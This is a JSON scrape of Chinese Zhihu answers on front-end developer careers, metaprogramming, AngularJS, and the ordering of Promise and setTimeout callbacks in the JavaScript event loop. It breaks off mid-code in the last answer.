[
  {
    "question": "\n月薪10-12k的前端人员应该具备怎样一种技术水平？\n",
    "author": "匿名用户",
    "content": "\n\n<textarea hidden class=\"content\">作为一个月薪30k+的前端的太太（文科女），我来说一下我先生的生活状态：&lt;br&gt;&lt;br&gt;1、白天上班（有点废话），呵呵&lt;br&gt;2、晚上参加公司的分享和交流活动&lt;br&gt;3、通常10:30以后到家，略吃点东西，看技术论坛、书、知乎、code他说他想做的东西；期间微信不断跟同事或技术伙伴交流&lt;br&gt;4、2点后可能会上床睡觉（最高纪录是5:30）&lt;br&gt;5、周末会睡到早上11点，起床后继续捧着电脑、书，或code。难得会出去吃个饭、看个电影什么的&lt;br&gt;6、更多的周末是带着他手下的人跑各地参加技术论坛，做分享或听分享；如果仅周六的会，那周日会放松一下再回；如果两天的会，那就没放松&lt;br&gt;&lt;br&gt;他从不说他精通什么，一直不断在学习，他说：这个行业，不学习就马上被淘汰。我很高兴他能做他喜欢的职业，并能为之努力！&lt;br&gt;&lt;br&gt;LZ，你的工作生活又是怎样的呢？</textarea>\n\n\n<div class=\"zh-summary summary clearfix\">\n\n作为一个月薪30k+的前端的太太（文科女），我来说一下我先生的生活状态： 1、白天上班（有点废话），呵呵 2、晚上参加公司的分享和交流活动 3、通常10:30以后到家，略吃点东西，看技术论坛、书、知乎、code他说他想做的东西；期间微信不断跟同事或技术伙伴…\n\n<a href=\"/question/28044664/answer/39392189\" class=\"toggle-expand\">显示全部</a>\n\n</div>\n\n\n\n<p class=\"visible-expanded\"><a itemprop=\"url\" class=\"answer-date-link meta-item\" target=\"_blank\" href=\"/question/28044664/answer/39392189\">发布于 2015-02-10</a></p>\n\n",
    "link": "https://zhihu.com/question/28044664/answer/39392189"
  },
  {
    "question": "\n为什么前端不能一直做？难道要转行？？\n",
    "author": "貘吃馍香",
    "content": "\n\n<textarea hidden class=\"content\">岗位天花板太低是最大的问题，除了几个特互联网大公司，前端可能会提供有限数量（个人认为小于10）个总监级前端岗位外，绝大部分人的天花板就在工程师这一层。因此也就没可能调用更多的资源，完成更”伟大“的事情。&lt;br&gt;&lt;br&gt;一线互联网公司会吸纳一部分高工、资深、专家岗位，二三线互联网公司中也仅能提供不多的高工、资深、专家岗位。&lt;br&gt;&lt;br&gt;但是这些”高级“岗位绝大多数非精英来说，基本上也是无望。&lt;br&gt;&lt;br&gt;在传统IT企业，前端岗位更是可有可无。&lt;br&gt;&lt;br&gt;因此对大部分普通人来说，在个人精力能力有限的情况下，更好的选择是转行不做前端，投入到PHP JAVA等有更多从业者更多和岗位天花板更高的行业中去。&lt;br&gt;&lt;br&gt;这样即使降级到传统的大小型IT企业，哪怕是普通公司的 IT 部门，任然可以比较轻松的拿到总监级岗位。当然这样薪资是不可能比上精英前端们的，不过从职业发展空间来看还有个上升的盼头。相对于降级论了么。&lt;br&gt;&lt;br&gt;这就是偶这种普通从业者认为必须转行的原因。&lt;br&gt;&lt;br&gt;现在 nodejs 什么的后端 js 流行，它的确会扩大前端队伍。但是个人认为，抬升岗位天花板的程度有限。毕竟它也仅仅流行在一些大型互联网公司，更广阔的传统 IT 行业内并不常见。&lt;br&gt;&lt;br&gt;当然，作为精英们就无视以上这些好了，在精英圈子里，拼无限的精力去挣那几个有限的坑也是蛮有意思的。我等小白明白怎么回事，围观起哄就好了么。&lt;br&gt;&lt;br&gt;活活活，又说了一堆不好听的话，坐等被折叠。</textarea>\n\n\n<div class=\"zh-summary summary clearfix\">\n\n岗位天花板太低是最大的问题，除了几个特互联网大公司，前端可能会提供有限数量（个人认为小于10）个总监级前端岗位外，绝大部分人的天花板就在工程师这一层。因此也就没可能调用更多的资源，完成更”伟大“的事情。 一线互联网公司会吸纳一部分高工、资深…\n\n<a href=\"/question/26226720/answer/32521677\" class=\"toggle-expand\">显示全部</a>\n\n</div>\n\n\n\n<p class=\"visible-expanded\"><a itemprop=\"url\" class=\"answer-date-link meta-item\" target=\"_blank\" href=\"/question/26226720/answer/32521677\">发布于 2014-10-27</a></p>\n\n",
    "link": "https://zhihu.com/question/26226720/answer/32521677"
  },
  {
    "question": "\n怎么理解元编程？\n",
    "author": "涛吴",
    "content": "\n\n<textarea hidden class=\"content\">Meta- 这个前缀在希腊语中的本意是「在…后，越过…的」，类似于拉丁语的 post-，比如 metaphysics 就是「在物理学之后」，这个词最开始指一些亚里士多德的著作，因为它们通常排序在《物理学》之后。&lt;br&gt;&lt;br&gt;但西方哲学界在几千年中渐渐赋予该词缀一种全新的意义：关于某事自身的某事。比如 meta-knowledge 就是「关于知识本身的知识」，meta-data 就是「关于数据的数据」，meta-language 就是「关于语言的语言」，而 meta-programming 也是由此而来，是「关于编程的编程」。&lt;br&gt;&lt;br&gt;弄清了词源和字面意思，可知大陆将 meta- 这个前缀译为「元」并不恰当。台湾译为「后设」，稍微好一点点，但仍旧无法望文生义。也许「自相关」是个不错的选择，「自相关数据」、「自相关语言」、「自相关编程」——但是好像又太罗嗦了。&lt;br&gt;&lt;br&gt;Anyway。先看看 meta-data：&lt;br&gt;&lt;br&gt;「我的电话是 +86 123 4567 8910」&lt;br&gt;  ——这是一条数据；&lt;br&gt;「+86 123 4567 8910 有十三个数字和一个字符，前两位是国家代码，后面是一个移动电话号码」   —— 这是关于前面那条数据的数据。&lt;br&gt;&lt;br&gt;那么照猫画虎，怎样才算 meta-programming 呢？泛泛来说，只要是与编程相关的编程就算是 meta-programming 了——比如，若编程甲可以输出 A - Z，那么写程序甲算「编程」；而程序乙可以&lt;b&gt;生成&lt;/b&gt;程序甲（也许还会连带着运行它输出 A - Z），那么编写程序乙的活动，就可以算作 meta-programming，「元编程」。注意，程序甲和程序乙并不一定是同一种语言：&lt;br&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-rb&quot;&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'A'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Z'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;\n    &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;python -c 'print &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;'&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;\n&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;\n&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;如此说来，inline SQL 甚至动态生成 HTML 也是元编程了？抠定义的话是这样吧。&lt;br&gt;&lt;br&gt;不过 metaprogramming 更狭义的意思应该是指「编写能改变语言语法特性或者运行时特性的程序」。换言之，一种语言本来做不到的事情，通过你编程来修改它，使得它可以做到了，这就是元编程。本版同文提及 method_missing，那么 &lt;a href=&quot;//link.zhihu.com/?target=https%3A//www.destroyallsoftware.com/talks/wat&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Wat —\n    Destroy All Software   Talks&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt; 之中给出了运行时元编程的经典范例：&lt;br&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;gt;&amp;gt; ruby has no bare words\nNameError: undefined local variable or method `words' for main:Object\n        from (irb) 1\n&amp;gt;&amp;gt; def method_missing(*args); args.join(&quot; &quot;); end\n=&amp;gt; nil\n&amp;gt;&amp;gt; ruby has bare words\n=&amp;gt; &quot;ruby has bare words&quot;\n&amp;gt;&amp;gt; bare words can even have bangs!\n=&amp;gt; &quot;bare words can even have bangs!&quot;\n&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;C、C++、Python、JavaScript…… 多数流行的语言或多或少都有元编程能力；Lisp 诸方言更是以元编程为基本。而 Ruby 更是因为元编程易用又强大，被许多人拿来写 DSL，因为元编程可以捏出「本不存在的语法特性」来让书写 DSL 变得简单。</textarea>\n\n\n<div class=\"zh-summary summary clearfix\">\n\nMeta- 这个前缀在希腊语中的本意是「在…后，越过…的」，类似于拉丁语的 post-，比如 metaphysics 就是「在物理学之后」，这个词最开始指一些亚里士多德的著作，因为它们通常排序在《物理学》之后。 但西方哲学界在几千年中渐渐赋予该词缀一种全新的意义：…\n\n<a href=\"/question/23856985/answer/25965835\" class=\"toggle-expand\">显示全部</a>\n\n</div>\n\n\n\n<p class=\"visible-expanded\"><a itemprop=\"url\" class=\"answer-date-link meta-item\" data-tooltip=\"s$t$发布于 2014-05-23\" target=\"_blank\" href=\"/question/23856985/answer/25965835\">编辑于 2015-04-14</a></p>\n\n",
    "link": "https://zhihu.com/question/23856985/answer/25965835"
  },
  {
    "question": "\n我现在大三中途转行,告诉我安卓的前景并不好,我学安卓不久,他建议我转网页,我很迷茫,各位前辈有何建议?\n",
    "author": "宗宇",
    "content": "\n\n<textarea hidden class=\"content\">从前有一个人快要饿死了，于是来知乎要饭，一群有钱人对他说，你再努力干十几天活，实在不行换个城市干，到时候啊，你想吃什么就可以买什么啦。这个人真的去做了，然后呢，然后他饿死了。&lt;br&gt;&lt;br&gt;=== 以上是有感而发===&lt;br&gt;&lt;br&gt;不知道楼上那么多说鼓吹基础知识的人是怎么想的。&lt;br&gt;&lt;br&gt;API的熟练程度决定一个人下限，同时也决定一个人的起点。&lt;br&gt;&lt;br&gt;编出能力，理论知识，学习能力决定一个人的上限，也决定一个人的终点。&lt;br&gt;&lt;br&gt;一群人和一个快饿死的人说，你再忍忍再过十几天你想吃什么你就能买得起什么，这是好心么，这是谋财害命。追求生活品质和人生价值那是有钱人的事，一般人还是多考虑一下如何养家糊口。&lt;br&gt;&lt;br&gt;对于楼主，建议你先给我点赞，继续学安卓API，尽量练习到看到需求，想都不想就能写出来界面和交互的层面，毕业了找个稳定的工作，先把这最难的一段时间过去。工作之后再过来改成反对，去点前面某大v的赞，然后按照他们的思路继续深造自己。&lt;br&gt;&lt;br&gt;我给你开的是毒药，但并不想害你，有时候找不到工作带来的压力不是人能承受的，先让自己有工作，有话语权之后，再考虑提升素养对抗风险的事吧。</textarea>\n\n\n<div class=\"zh-summary summary clearfix\">\n\n从前有一个人快要饿死了，于是来知乎要饭，一群有钱人对他说，你再努力干十几天活，实在不行换个城市干，到时候啊，你想吃什么就可以买什么啦。这个人真的去做了，然后呢，然后他饿死了。 === 以上是有感而发=== 不知道楼上那么多说鼓吹基础知识的人是怎么…\n\n<a href=\"/question/45902634/answer/100228187\" class=\"toggle-expand\">显示全部</a>\n\n</div>\n\n\n\n<p class=\"visible-expanded\"><a itemprop=\"url\" class=\"answer-date-link meta-item\" data-tooltip=\"s$t$发布于 2016-05-11\" target=\"_blank\" href=\"/question/45902634/answer/100228187\">编辑于 2016-05-11</a></p>\n\n",
    "link": "https://zhihu.com/question/45902634/answer/100228187"
  },
  {
    "question": "\nAngularJS 于前端开发有什么作用，对比其它框架有何优点？\n",
    "author": "caoglish",
    "content": "\n\n<textarea hidden class=\"content\">未来的发展趋势是前端后端只靠json数据来进行通信：后端只处理和发送一段json数据到前端，然后计算和模板渲染都在前端进行。而前端的改动后，形成json数据然后传回到后端。未来趋势就是：&lt;i&gt;&lt;b&gt;后台程序再也不做模板的任何处理&lt;/b&gt;&lt;/i&gt;&lt;br&gt;&lt;br&gt;AngularJS 的作用简单说就是就是把后台的json值直接用html进行渲染，然后html的操作又直接在形成json传回后台。&lt;br&gt;&lt;br&gt;未来的后台MVC，试图不再是模板了，而是一段结构整齐标准的JSON，而这个JSON作为前台的model直接在AngularJS直接使用。&lt;br&gt;&lt;br&gt;或者说后台的试图是前台的模型，而整个前台就是后台的视图。后台程序再也不做模板的任何处理了。&lt;br&gt;&lt;br&gt;&lt;br&gt;Angular是框架的一种，不学也能开发前端。学backbone或者ember也能开发前端。没有js的mvc，就光弄个jquery，也能开发前端。&lt;br&gt;&lt;br&gt;那\n到底要不要学？个人觉得就是要看发展趋势。angular是否简化的前端开发，是否符合未来前端的开发趋势。以现在的js的发展程度来看，angular\n是符合发展趋势的，第一，解耦前端，第二，可以模块化，第三可测试，第四天生支持json，第五依赖注入等等等，还有一些其他特性使得angular跟随\n甚至是推动了前端的开发趋势。&lt;br&gt;&lt;br&gt;所以说angular学习是有好处的：&lt;br&gt;1.了解前端的开发趋势&lt;br&gt;2.学习MV*的设计方法&lt;br&gt;3.学习模块化编程&lt;br&gt;4.学习如何测试模块&lt;br&gt;5.使用angular简化开发流程&lt;br&gt;6.随着google的大力支持和逐渐流行，公司开始使用angular，有些岗位需要有angular的知识才能工作。</textarea>\n\n\n<div class=\"zh-summary summary clearfix\">\n\n未来的发展趋势是前端后端只靠json数据来进行通信：后端只处理和发送一段json数据到前端，然后计算和模板渲染都在前端进行。而前端的改动后，形成json数据然后传回到后端。未来趋势就是：<i><b>后台程序再也不做模板的任何处理</b></i> AngularJS 的作用简单说就是就是把…\n\n<a href=\"/question/22079371/answer/21369786\" class=\"toggle-expand\">显示全部</a>\n\n</div>\n\n\n\n<p class=\"visible-expanded\"><a itemprop=\"url\" class=\"answer-date-link meta-item\" data-tooltip=\"s$t$发布于 2014-01-04\" target=\"_blank\" href=\"/question/22079371/answer/21369786\">编辑于 2014-01-06</a></p>\n\n",
    "link": "https://zhihu.com/question/22079371/answer/21369786"
  },
  {
    "question": "\nPromise的队列与setTimeout的队列的有何关联？\n",
    "author": "何幻",
    "content": "\n\n<textarea hidden class=\"content\">&lt;b&gt;先把问题贴一下：&lt;/b&gt;&lt;br&gt;&lt;br&gt;Promise的队列与setTimeout的队列的有何关联？&lt;br&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;nx&quot;&gt;setTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)},&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;\n&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Promise&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;resolve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;\n    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;\n    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10000&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;\n        &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9999&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;resolve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;\n    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;\n    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;\n&lt;span class=&quot;p&quot;&gt;}).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;\n    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;\n&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;\n&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;\n&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;为什么结果是：&lt;br&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;1,2,3,5,4\n&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;而不是：&lt;br&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;1,2,3,4,5\n&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;br&gt;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -&lt;br&gt;&lt;br&gt;不想看故事的，直接看结论在这。&lt;br&gt;&lt;br&gt;&lt;b&gt;原因：&lt;/b&gt;&lt;br&gt;有一个事件循环，但是&lt;b&gt;任务队列可以有多个&lt;/b&gt;。&lt;br&gt;整个script代码，放在了macrotask queue中，setTimeout也放入macrotask queue。&lt;br&gt;但是，promise.then放到了另一个任务队列&lt;b&gt;microtask queue&lt;/b&gt;中。&lt;br&gt;这两个任务队列执行顺序如下，取1个macrotask queue中的task，执行之。&lt;br&gt;然后把所有&lt;b&gt;microtask queue&lt;/b&gt;顺序执行完，再取macrotask queue中的下一个任务。&lt;br&gt;&lt;br&gt;&lt;p&gt;代码开始执行时，所有这些代码在macrotask\nqueue中，取出来执行之。&lt;/p&gt;&lt;p&gt;后面遇到了setTimeout，又加入到macrotask queue中，&lt;/p&gt;&lt;p&gt;然后，遇到了promise.then，&lt;b&gt;放入到了另一个队列&lt;/b&gt;&lt;b&gt;microtask queue&lt;/b&gt;。&lt;/p&gt;&lt;p&gt;等整个execution context\nstack执行完后，&lt;/p&gt;&lt;p&gt;下一步该取的是&lt;b&gt;microtask queue&lt;/b&gt;中的任务了。&lt;/p&gt;&lt;br&gt;&lt;p&gt;因此promise.then的回调比setTimeout先执行。&lt;/p&gt;&lt;br&gt;(下面，多图，多坑，多水。。。危险。。。&lt;br&gt;&lt;br&gt;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -&lt;br&gt;&lt;br&gt;&lt;b&gt;本来我是这样以为的：&lt;/b&gt;&lt;br&gt;&lt;br&gt;因为promise.then既可以在pending的时候注册回调，也可以在fullfill状态注册回调。&lt;br&gt;在pending的时候，注册的是异步回调。而在fullfill状态，注册的是同步回调。&lt;br&gt;只有异步回调才会依赖任务队列，而同步回调马上执行。&lt;br&gt;&lt;br&gt;题主这种情况，注册的是同步回调。&lt;br&gt;&lt;br&gt;注意，new Promise是同步的，会马上执行function参数中的事情。&lt;br&gt;等function参数执行完，new Promise才返回一个promise实例对象。&lt;br&gt;这时候再调用then，其实是已经fullfill了。&lt;br&gt;&lt;br&gt;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -&lt;br&gt;&lt;br&gt;&lt;b&gt;然而，我错了。&lt;/b&gt;&lt;br&gt;&lt;br&gt;感谢 &lt;a data-hash=&quot;9a8a93dc38bfeab2b1085a76ed28b79e&quot; href=&quot;//www.zhihu.com/people/9a8a93dc38bfeab2b1085a76ed28b79e&quot; class=&quot;member_mention&quot; data-editable=&quot;true&quot; data-title=&quot;@richard&quot; data-hovercard=&quot;p$b$9a8a93dc38bfeab2b1085a76ed28b79e&quot;&gt;@richard&lt;/a&gt; 指正。&lt;br&gt;因为，如果promise.then注册的是同步回调的话，5应该比3先执行。&lt;br&gt;&lt;br&gt;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -&lt;br&gt;&lt;br&gt;那好吧，&lt;b&gt;从零开始了，重新分析问题&lt;/b&gt;。&lt;br&gt;&lt;br&gt;老老实实翻开规范《ECMAScript® 2015 Language Specification》，搜setTimeout。&lt;br&gt;纳尼？没有。&lt;br&gt;&lt;br&gt;想起来了，这是window对象的东西，跟&lt;b&gt;浏览器宿主环境&lt;/b&gt;有关，不属于EcmaScript范围。&lt;br&gt;那怎么搞，每个浏览器难道自己随便实现吗？谷歌了一把，找到了这个：&lt;br&gt;&lt;a href=&quot;//link.zhihu.com/?target=http%3A//stackoverflow.com/questions/8852198/settimeout-if-not-defined-in-ecmascript-spec-where-can-i-learn-how-it-works&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;javascript - setTimeout(): If not defined in EcmaScript spec, where can I learn how it works?&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;br&gt;原来HTML5规范中还是有介绍的。&lt;a href=&quot;//link.zhihu.com/?target=http%3A//www.w3.org/TR/html5/webappapis.html%23timers&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;6.4 Timers&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;br&gt;&lt;br&gt;查了查setTimeout，似乎没什么收获，那再看看HTML的事件循环吧。&lt;br&gt;&lt;a href=&quot;//link.zhihu.com/?target=http%3A//www.w3.org/TR/html5/webappapis.html%23event-loops&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;6.1.4 Event loops&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;br&gt;&lt;br&gt;&lt;b&gt;一个浏览器环境，只能有一个事件循环&lt;/b&gt;&lt;br&gt;&lt;img src=&quot;https://pic3.zhimg.com/f7cabad79a3fd52b5d9de3df14791aba_b.png&quot; data-rawwidth=&quot;578&quot; data-rawheight=&quot;175&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;578&quot; data-original=&quot;https://pic3.zhimg.com/f7cabad79a3fd52b5d9de3df14791aba_r.png&quot;&gt;&lt;br&gt;&lt;b&gt;而一个事件循环可以多个任务队列&lt;/b&gt;&lt;br&gt;&lt;img src=&quot;https://pic4.zhimg.com/cdbf1ab0e475d630cf277d8b2b4ae333_b.png&quot; data-rawwidth=&quot;593&quot; data-rawheight=&quot;341&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;593&quot; data-original=&quot;https://pic4.zhimg.com/cdbf1ab0e475d630cf277d8b2b4ae333_r.png&quot;&gt;&lt;br&gt;&lt;b&gt;关于任务源：&lt;/b&gt;&lt;br&gt;&lt;img src=&quot;https://pic3.zhimg.com/dd563c9e6dcdd7ddf9227bd0aa2cf5aa_b.png&quot; data-rawwidth=&quot;609&quot; data-rawheight=&quot;251&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;609&quot; data-original=&quot;https://pic3.zhimg.com/dd563c9e6dcdd7ddf9227bd0aa2cf5aa_r.png&quot;&gt;&lt;br&gt;它指出，一个浏览器环境（unit of related similar-origin browsing contexts.）只能有一个事件循环（Event loop），而一个事件循环可以多个任务队列（Task queue），每个任务都有一个任务源（Task source）。&lt;br&gt;相同任务源的任务，只能放到一个任务队列中。&lt;br&gt;不同任务源的任务，可以放到不同任务队列中。&lt;br&gt;（同一个任务队列，能否容纳不同任务源的任务，没说）&lt;br&gt;又举了一个例子说，客户端可能实现了一个包含鼠标键盘事件的任务队列，还有其他的任务队列，而给鼠标键盘事件的任务队列更高优先级，例如75%的可能性执行它。这样就能保证流畅的交互性，而且别的任务也能执行到了。但是，同一个任务队列中的任务必须按先进先出的顺序执行。&lt;br&gt;&lt;br&gt;&lt;b&gt;结论：可以有多个任务队列，目的想必是方便调整优先级吧。&lt;/b&gt;&lt;br&gt;&lt;br&gt;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -&lt;br&gt;&lt;br&gt;回到&lt;b&gt;EcmaScript规范&lt;/b&gt;上来，&lt;br&gt;&lt;b&gt;76页 8.4 Jobs and Job Queues&lt;/b&gt;&lt;br&gt;&lt;img src=&quot;https://pic4.zhimg.com/5014ab6454bc214f76e3260fb68c3a1b_b.png&quot; data-rawwidth=&quot;660&quot; data-rawheight=&quot;178&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;660&quot; data-original=&quot;https://pic4.zhimg.com/5014ab6454bc214f76e3260fb68c3a1b_r.png&quot;&gt;它指出，任务队列（Job queue）是一个先进先出的队列，每一个任务队列是有名字的，至于有多少个任务队列，取决于实现。每一个实现至少应该包含以上两个任务队列。&lt;br&gt;&lt;br&gt;以下又强调了，单独的任务队列中的任务总是按先进先出的顺序执行，但是&lt;b&gt;不保证多个任务队列中的任务优先级，具体实现可能会交叉执行&lt;/b&gt;。&lt;br&gt;&lt;img src=&quot;https://pic4.zhimg.com/0c6864c8a0e8a5f7f5abd8f9ddcddbe3_b.png&quot; data-rawwidth=&quot;662&quot; data-rawheight=&quot;83&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;662&quot; data-original=&quot;https://pic4.zhimg.com/0c6864c8a0e8a5f7f5abd8f9ddcddbe3_r.png&quot;&gt;&lt;br&gt;哪里用到这个任务队列了呢，Promise就用了，492页。&lt;br&gt;&lt;img src=&quot;https://pic4.zhimg.com/fed4b5f8710e3c3473e12a181394845f_b.png&quot; data-rawwidth=&quot;657&quot; data-rawheight=&quot;381&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;657&quot; data-original=&quot;https://pic4.zhimg.com/fed4b5f8710e3c3473e12a181394845f_r.png&quot;&gt;题主的问题，属于fulfilled的情况，如图所示。&lt;br&gt;会把一个任务放到名为“PromiseJobs”的任务队列中。&lt;br&gt;&lt;br&gt;&lt;b&gt;结论：EcmaScript的Job queue与HTML的Task queue有异曲同工之妙。它们都可以有好几个，多个任务队列之间的顺序都是不保证的。&lt;/b&gt;&lt;br&gt;&lt;br&gt;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -&lt;br&gt;&lt;br&gt;&lt;b&gt;那为什么setTimeout会后执行呢，可能是它所属的任务队列优先级比较低吧。&lt;/b&gt;&lt;br&gt;我之前对这个问题产生了误解，主要是规范研究的不仔细，以为任务队列只有一个。&lt;br&gt;&lt;br&gt;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -&lt;br&gt;&lt;br&gt;&lt;b&gt;更新一：&lt;/b&gt;&lt;br&gt;&lt;br&gt;关于和tick的关系，群里的小伙伴们尝试了各种办法，在昵称为“&lt;b&gt;第七片魂器&lt;/b&gt;”大神的指点下，&lt;br&gt;我们先后用&lt;b&gt;setImmediate&lt;/b&gt;和&lt;b&gt;process.nextTick&lt;/b&gt;进行了实验。（node.js。。。&lt;br&gt;&lt;br&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span 